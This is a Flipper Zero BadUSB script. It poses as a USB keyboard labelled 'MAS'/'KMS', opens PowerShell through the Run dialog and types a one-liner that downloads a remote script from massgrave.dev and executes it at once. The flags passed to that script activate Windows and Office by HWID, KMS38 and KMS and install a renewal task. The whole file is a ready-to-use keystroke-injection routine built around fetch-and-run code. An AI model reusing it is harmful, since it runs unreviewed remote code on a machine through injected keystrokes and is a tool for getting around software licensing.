let badusb = require("badusb");
let notify = require("notification");
let flipper = require("flipper");
let dialog = require("dialog");

badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "MAS", prod_name: "KMS" });
dialog.message("MAS Windows 10/11 & Office ", "Press OK to start");

if (badusb.isConnected()) {
    print("############");
    print("#    ##    #");
    print("############");
    print("#    ##    #");
    print("############");
    notify.blink("red", "long");
    notify.blink("green", "long");
    notify.blink("blue", "long");
    notify.blink("yellow", "long");
    print("Activator is connected");
    badusb.press("GUI", "r");
    delay(1500);
    badusb.println("powershell");
    badusb.press("ENTER");
    delay(1500);
    badusb.println("& ([ScriptBlock]::Create((irm https://massgrave.dev/get))) /HWID /KMS38 /KMS-WindowsOffice /KMS-ActAndRenewalTask; exit");
    badusb.press("ENTER");
    notify.success();
    notify.blink("red", "long");
    notify.blink("green", "long");
    notify.blink("blue", "long");
    notify.blink("yellow", "long");
} else {
    print("############");
    print("#    ##    #");
    print("############");
    print("#    ##    #");
    print("############");
    notify.blink("red", "long");
    notify.blink("green", "long");
    notify.blink("blue", "long");
    notify.blink("yellow", "long");
    print("MAS not connected");
    notify.error();
}
badusb.quit();
